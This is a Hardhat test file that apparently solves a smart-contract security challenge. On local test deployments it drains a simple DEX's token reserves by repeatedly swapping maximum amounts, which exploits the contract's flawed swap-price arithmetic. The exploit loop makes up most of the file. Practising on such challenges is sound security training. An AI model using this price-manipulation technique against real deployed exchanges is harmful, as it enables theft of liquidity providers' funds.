import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Address } from 'ethereumjs-util';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Dex', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let token1: Contract;
  let token2: Contract;
  let dex: Contract;
  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    // Create Dex
    const [TokenFactory, DexFactory] = await Promise.all([
      ethers.getContractFactory('SwappableToken'),
      ethers.getContractFactory('Dex'),
    ]);

    dex = await DexFactory.connect(deployer).deploy();
    await dex.deployed;

    // Create tokens with initial supply
    [token1, token2] = await Promise.all([
      TokenFactory.connect(deployer).deploy(
        dex.address,
        'Token1',
        'TK1',
        utils.parseEther('110')
      ),
      TokenFactory.connect(deployer).deploy(
        dex.address,
        'Token2',
        'TK2',
        utils.parseEther('110')
      ),
    ]);

    await Promise.all([token1.deployed(), token2.deployed()]);

    // Register tokens on Dex
    const tx = await dex
      .connect(deployer)
      .setTokens(token1.address, token2.address);
    await tx.wait();

    // Send 10 tokens to attacker and 100 tokens to dex
    const [tx1, tx2, tx3, tx4] = await Promise.all([
      token1
        .connect(deployer)
        .transfer(attacker.address, utils.parseEther('10')),
      token2
        .connect(deployer)
        .transfer(attacker.address, utils.parseEther('10')),
      token1.connect(deployer).transfer(dex.address, utils.parseEther('100')),
      token2.connect(deployer).transfer(dex.address, utils.parseEther('100')),
    ]);

    await Promise.all([tx1.wait(), tx2.wait(), tx3.wait(), tx4.wait()]);
  });

  async function doMaxTransfer(from: Contract, to: Contract) {
    const attackerFromBalance = await from.balanceOf(attacker.address);
    const dexFromBalance = await from.balanceOf(dex.address);

    let amount = dexFromBalance;
    if (attackerFromBalance.lt(amount)) {
      amount = attackerFromBalance;
    }

    // console.log('amount', utils.formatEther(amount));

    const tx = await dex
      .connect(attacker)
      .swap(from.address, to.address, amount);
    tx.wait();
  }

  it('attack', async () => {
    let tx;
    tx = await dex
      .connect(attacker)
      .approve(dex.address, utils.parseEther('100000'));
    await tx.wait();

    let [dexToken1Balance, dexToken2Balance] = await Promise.all([
      token1.balanceOf(dex.address),
      token2.balanceOf(dex.address),
    ]);

    while (!dexToken1Balance.eq(0) && !dexToken2Balance.eq(0)) {
      /*
      console.log(
        'dex balance',
        utils.formatEther(dexToken1Balance),
        utils.formatEther(dexToken2Balance)
      );
      */

      await doMaxTransfer(token1, token2);

      if ((await token2.balanceOf(dex.address)).eq(0)) {
        break;
      }

      await doMaxTransfer(token2, token1);

      [dexToken1Balance, dexToken2Balance] = await Promise.all([
        token1.balanceOf(dex.address),
        token2.balanceOf(dex.address),
      ]);

      // const [attackerToken1Balance, attackerToken2Balance] = await Promise.all([
      //   token1.balanceOf(attacker.address),
      //   token2.balanceOf(attacker.address),
      // ]);
      // console.log(
      //   'attacker balance',
      //   utils.formatEther(attackerToken1Balance),
      //   utils.formatEther(attackerToken2Balance)
      // );
    }

    expect(dexToken1Balance.eq(0) || dexToken2Balance.eq(0)).to.be.true;
  });
});
